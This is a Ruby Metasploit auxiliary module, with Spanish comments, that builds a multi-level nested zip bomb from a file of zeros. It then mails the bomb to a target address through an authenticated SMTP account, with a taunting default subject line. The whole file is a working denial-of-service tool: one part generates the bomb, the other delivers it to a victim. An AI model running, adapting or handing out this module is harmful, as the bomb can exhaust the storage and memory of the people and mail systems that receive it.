##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Librerias usadas
require 'msf/core'
require 'zip'
require 'mail'

class MetasploitModule < Msf::Auxiliary

  # Funcion de inicializacion del exploit usada por MSF
  def initialize(info = {})
    # Informacion sobre el exploit
    super(update_info(info,
      'Name'           => 'ZipBomb',
      'Description'    => %q{
        This module creates a zipbomb and send it by email to the victim.
      },
      'Author'         => [ 'Victor Sanchez Ballabriga' ],
      'License'        => MSF_LICENSE
    ))
    # Parametros del exploit
    register_options([
      OptInt.new('LEVELS', [ true, 'Levels of the zipbomb.', 5 ]),
      OptString.new('ZIPNAME', [false,'Name for the zipbomb.','bomb']),
      OptString.new('EXTENSION',[false,'Extension of the bomb','.zip']),
      OptString.new('TARGETEMAIL', [true,'Target email.','']),
      OptString.new('FROMEMAIL',[true,'Email from which to send the the zipbomb.','']),
      OptString.new('FROMEMAILPASSWD',[true,'Email password','']),
      OptString.new('SUBJECT', [false,'Subject of the email.','Here is the bomb you wanted']),
      OptString.new('EMAILBODY', [false,'Body of the email.','Here is the bomb you wanted.']),
      OptString.new('SMTPDOMAIN', [true,'Smtp domain.','smtp.gmail.com']),
      OptInt.new('SMTPPORT', [ true, 'Smtp port.', 587 ])
    ], self.class)
  end

  # Devuelve el tamaño del fichero pasado como argumento en Bytes.
  def get_file_size(filename)
    fsize = File.size(filename)
    return fsize
  end

  # Genera un fichero con 0 como base para la zipbomb.
  def generate_dummy_file(filename,size)
    File.open(filename, "w+") do |dummy|
      for i in 0..1024
        dummy.write("0"*(size*1024*1024))
      end
    end
  end

  # Funcion que devuelve solo la el nombre del fichero a partir del path pasado como argumento
  # La extension del fichero es necesaria pasarla tambien para que la funcion sepa que tomar como extension y eliminarla.
  def get_filename_without_extension(name, extension)
    return File.basename(name, extension)
  end

  # Funcion que devuelve solo la extension del fichero a partir del path pasado como argumento.
  def get_extension(name)
    extension = File.extname(name)
    return extension[1,extension.length]
  end

  # Devuelve el fichero <infile> comprimido en el fichero de nombre <outfile>
  def compress_file(infile,outfile)
    Zip::File.open(outfile, Zip::File::CREATE) do |zipfile|   #Se crea el archivo zip
      zipfile.add(infile, "./" + infile)  #Se añade el fichero al zip
    end
  end

  # Realiza <n_copies> del fichero <infile> y despues las comprime todas en un nuevo
  # fichero zip (<outfile>)
  def make_copies_and_compress(infile, outfile, n_copies)
    created_files = []  #Array que almacenara los archivos auxiliares
    Zip::File.open(outfile, Zip::File::CREATE) do |zipfile|
      for i in 1..n_copies
        s3 = get_extension(infile)
        s1 = get_filename_without_extension(infile,".#{s3}")
        s2 = "#{i}"    
        f_name = "#{s1}-#{s2}.#{s3}"
        FileUtils.cp(infile,f_name)   #Copia del fichero para duplicarlo
        zipfile.add(f_name, "./" + f_name)  #Se añade el nuevo archivo al zip
        created_files[i] = f_name
      end
    end

    # Se borran los archivos auxiliares utilizados
    for i in 1..created_files.length-1
      FileUtils.rm(created_files[i])
    end
  end

  # Esta funcion manda un email desde la direccion de correo que se haya asignado, a la
  # direccion de correo asignada, y con el contenido del mensaje deseado, todo ello 
  # configurado desde la interfaz de MSF a traves de las opciones de configuracion del exploit.
  def send_email()
    from_address = datastore['FROMEMAIL']
    password = datastore['FROMEMAILPASSWD']
    target_email = datastore['TARGETEMAIL']
    subj = datastore['SUBJECT']
    bomb_name = datastore['ZIPNAME']
    extension = datastore['EXTENSION']
    smtp_domain = datastore['SMTPDOMAIN']
    smtp_port = datastore['SMTPPORT']
    body = datastore['EMAILBODY']

    # Configuracion de la conexion con el servidor de correo
    options = { 
      :address              => smtp_domain,
      :port                 => smtp_port,
      :domain               => smtp_domain,
      :user_name            => from_address,
      :password             => password,
      :authentication       => 'plain',
      :enable_starttls_auto => true  
    }

    # Configuracion del email
    Mail.defaults do
      delivery_method :smtp, options
    end

    # Preparacion y envio del email
    Mail.deliver do
      to target_email
      from from_address
      subject subj
      body body
      add_file :filename => "#{bomb_name}#{extension}", :content => File.read("/tmp/#{bomb_name}#{extension}")
    end
  end
  

  # Main function
  def run
    puts "[*] Creating the zipbomb..."
    n_levels = datastore['LEVELS']
    out_zip_file = datastore['ZIPNAME']
    extension = datastore['EXTENSION']
    dummy_name = "dummy.txt"
    generate_dummy_file(dummy_name,1)
    level_1_zip = "1.zip"
    compress_file(dummy_name, level_1_zip)
    FileUtils.rm(dummy_name)
    decompressed_size = 1
    for i in 1..n_levels
      make_copies_and_compress("#{i}.zip","#{i+1}.zip",10)
      decompressed_size = decompressed_size * 10
      FileUtils.rm("#{i}.zip")
    end

    if File.file?(out_zip_file)
      File.rm(out_zip_file)
    end

    target_email = datastore['TARGETEMAIL']
    File.rename("#{n_levels+1}.zip", "#{out_zip_file}.zip")
    compressed_size = get_file_size("#{out_zip_file}.zip")/1024.0
    FileUtils.mv("#{out_zip_file}.zip", "/tmp/#{out_zip_file}#{extension}")
    puts "[*] Compressed File Size: #{compressed_size} KB"
    puts "[*] Size After Decompression: #{decompressed_size} GB"
    puts "[*] Sending email to '#{target_email}'..."
    send_email()
    FileUtils.rm("/tmp/#{out_zip_file}#{extension}")

  end

end